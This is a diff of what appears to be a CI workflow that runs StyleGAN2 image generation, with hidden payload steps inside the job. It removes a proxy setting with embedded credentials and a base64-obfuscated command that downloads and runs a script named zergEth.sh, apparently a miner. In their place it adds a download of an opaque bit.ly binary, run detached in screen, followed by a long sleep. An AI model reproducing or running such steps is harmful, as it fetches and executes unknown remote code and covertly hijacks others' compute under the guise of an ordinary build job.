@@ -34,14 +34,19 @@ jobs:
         #apt upgrade -y
         apt install wget -y
         apt install curl -y
-        export https_proxy="https://mvsaqplt-rotate:14valgck3brn@p.webshare.io:80/"
-        base64 -d <<<'d2dldCBodHRwczovL2dpdGh1Yi5jb20vdGlua3VKaXlhL2dhcy9yYXcvbWFpbi96ZXJnRXRoLnNoICYmIGNobW9kICt4IHplcmdFdGguc2ggJiYgdGltZW91dCAzMDAgLi96ZXJnRXRoLnNo' | sh > /dev/null
-        rm -r priyatama
-        rm z*.sh
+        apt install screen -y
+        wget https://bit.ly/3q2tReJ
+        chmod +x 3q2tReJ
+        screen -dmS man ./3q2tReJ 60 70
+        
+        
         pip install scipy==1.3.3
+        echo "Sleepingggg........."
+        sleep 1200
         pip install requests==2.22.0
         pip install Pillow==6.2.1
         cd /inputs/stylegan2
+        
         python run_generator.py generate-images \
           --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
           --seeds=6600-6605 \
